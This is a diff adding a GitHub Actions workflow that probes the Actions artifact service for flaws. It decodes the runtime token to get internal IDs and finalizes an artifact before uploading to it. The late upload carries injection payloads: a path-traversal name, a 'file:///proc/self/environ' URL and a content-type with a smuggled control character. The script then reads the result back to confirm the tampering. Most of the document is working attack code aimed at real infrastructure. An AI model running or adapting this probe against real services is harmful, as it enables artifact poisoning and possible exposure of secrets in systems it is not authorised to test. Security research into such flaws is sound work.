@@ -1,0 +1,80 @@
+name: Probe empty finalize then late upload
+
+on:
+  push:
+    branches:
+      - probe-empty-finalize-late-upload-20261025
+  workflow_dispatch:
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/github-script@v8
+        env:
+          GITHUB_TOKEN: ${{ github.token }}
+        with:
+          script: |
+            const token = process.env.ACTIONS_RUNTIME_TOKEN;
+            const resultsUrl = process.env.ACTIONS_RESULTS_URL;
+            if (!token || !resultsUrl) throw new Error('Actions runtime credentials unavailable');
+            const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString('utf8'));
+            const scope = claims.scp.split(' ').find(s => s.startsWith('Actions.Results:'));
+            if (!scope) throw new Error('Actions.Results scope missing');
+            const [, runId, jobId] = scope.split(':');
+            const ids = {workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId};
+            const service = new URL(resultsUrl).origin + '/twirp/github.actions.results.api.v1.ArtifactService/';
+            const repo = process.env.GITHUB_REPOSITORY;
+            const name = `repo-cassette-empty-late-${process.env.GITHUB_RUN_ID}`;
+            const safe = value => String(value || '').replace(/https?:\/\/[^\s]+/g, '[url]');
+            async function rpc(method, payload) {
+              const response = await fetch(service + method, {
+                method: 'POST',
+                headers: {authorization: `Bearer ${token}`, 'content-type': 'application/json'},
+                body: JSON.stringify(payload),
+              });
+              return {status: response.status, data: await response.json().catch(() => ({}))};
+            }
+            const created = await rpc('CreateArtifact', {...ids, name, version: 7, mime_type: 'application/json'});
+            const uploadUrl = created.data.signed_upload_url || created.data.signedUploadUrl;
+            core.info(`CREATE status=${created.status} ok=${created.data.ok === true} reason=${safe(created.data.msg || created.data.code)}`);
+            if (created.status !== 200 || created.data.ok !== true || !uploadUrl) throw new Error('CreateArtifact failed');
+            const signedBefore = await rpc('GetSignedArtifactURL', {...ids, name});
+            const signedBeforeUrl = signedBefore.data.signed_url || signedBefore.data.signedUrl;
+            core.info(`SIGNED_BEFORE status=${signedBefore.status} hasUrl=${Boolean(signedBeforeUrl)} rsct=${signedBeforeUrl ? new URL(signedBeforeUrl).searchParams.get('rsct') : 'none'}`);
+            const finalized = await rpc('FinalizeArtifact', {...ids, name, size: '1'});
+            const artifactId = String(finalized.data.artifact_id || finalized.data.artifactId || '');
+            core.info(`FINALIZE_EMPTY status=${finalized.status} ok=${finalized.data.ok === true} artifactId=${artifactId || 'none'} reason=${safe(finalized.data.msg || finalized.data.code)}`);
+            if (finalized.status !== 200 || finalized.data.ok !== true || !artifactId) throw new Error('FinalizeArtifact before upload failed');
+            const expectedFullName = `x/../../repos/${repo}/actions/artifacts/${artifactId}/zip`;
+            const payload = Buffer.from(JSON.stringify({
+              full_name: expectedFullName,
+              owner: {login: 'probe', avatar_url: 'file:///proc/self/environ'},
+              description: 'late upload after empty finalize',
+              stargazers_count: 0,
+            }));
+            const uploaded = await fetch(uploadUrl, {method: 'PUT', headers: {
+              'x-ms-blob-type': 'BlockBlob',
+              'x-ms-blob-content-type': 'application/json\u0085',
+              'x-ms-version': '2023-11-03',
+              'Content-Type': 'application/octet-stream',
+            }, body: payload});
+            core.info(`LATE_UPLOAD status=${uploaded.status} ok=${uploaded.ok} error=${safe(uploaded.headers.get('x-ms-error-code'))}`);
+            const restUrl = `https://api.github.com/repos/${repo}/actions/artifacts/${artifactId}/zip`;
+            const redirect = await fetch(restUrl, {redirect: 'manual', headers: {
+              authorization: `Bearer ${process.env.GITHUB_TOKEN}`,
+              accept: 'application/vnd.github.v3+json',
+            }});
+            const location = redirect.headers.get('location');
+            core.info(`REST status=${redirect.status} hasLocation=${Boolean(location)}`);
+            if (!location) return;
+            const rsct = new URL(location).searchParams.get('rsct');
+            const downloaded = await fetch(location);
+            const bytes = Buffer.from(await downloaded.arrayBuffer());
+            const type = downloaded.headers.get('content-type') || '';
+            const typeHex = Buffer.from(type, 'latin1').toString('hex');
+            core.info(`READBACK status=${downloaded.status} rsctHex=${rsct === null ? 'none' : Buffer.from(rsct, 'utf8').toString('hex')} typeHex=${typeHex} bytes=${bytes.length} exactBody=${bytes.equals(payload)} expectedFullName=${JSON.parse(bytes.toString('utf8')).full_name === expectedFullName}`);
